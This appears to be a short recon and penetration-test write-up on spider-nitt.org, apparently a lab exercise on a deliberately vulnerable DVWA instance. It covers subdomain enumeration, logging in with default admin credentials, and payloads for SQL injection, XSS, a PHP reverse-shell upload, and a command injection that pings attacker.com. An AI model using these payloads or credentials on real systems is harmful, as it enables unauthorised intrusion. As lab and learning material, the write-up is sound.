# Target Domain: `spider-nitt.org`

### Subdomain Enumeration

Tool used: `subfinder`  
Identified **~100 subdomains**. Full list archived in `subdomains.txt`. Notable examples include:

- `admin.spider-nitt.org`
- `ctf.spider-nitt.org` - not online
- `spidertest.spider-nitt.org` ← **[Vulnerable Application Found]**

---

### Vulnerability Candidate: `spidertest.spider-nitt.org`

Initial passive & active inspection suggested a login interface resembling DVWA.  
Tool used for fingerprinting: `nuclei`  

result - `spidertest.spider-nitt.org
[dvwa-default-login] [http] [critical] https://spidertest.spider-nitt.org/index.php [password="password",username="admin"]`



Upon login to `https://spidertest.spider-nitt.org` using default credentials, the DVWA instance was configured in **Low Security** mode. The following core vulnerabilities were tested and confirmed:

#### 1. SQL Injection
- **Page:** `vulnerabilities/sqli/`
- **Payload used:** `' OR '1'='1` in the `id` parameter.
- **Result:** Bypassed input validation, dumped user table entries.
![image](https://github.com/user-attachments/assets/818d28bf-6848-43ef-b900-b0b303d53006)


#### 2. Command Injection
- **Page:** `vulnerabilities/exec/`
- **Payload used:** `127.0.0.1; ping -c 3 attacker.com`
- **Result:** Remote commands were successfully injected and executed via system calls.
![image](https://github.com/user-attachments/assets/6d4dc3b8-1b81-4162-b546-5dc1e9ad589d)


#### 3. Reflected Cross-Site Scripting (XSS)
- **Page:** `vulnerabilities/xss_r/`
- **Payload:** `<script>alert(1)</script>`
- **Result:** JavaScript executed in the browser context; confirmed lack of output encoding.
![image](https://github.com/user-attachments/assets/2d5b7f34-21a2-45f7-8d22-fe931be22c9e)


#### 4. File Upload Vulnerability
- **Page:** `vulnerabilities/upload/`
- **Payload:** Uploaded `.php` reverse shell with fake image header.
- **Result:** Server accepted the file; able to invoke shell from `/hackable/uploads/` in red text.

These tests validated the presence of critical OWASP Top 10 vulnerabilities.

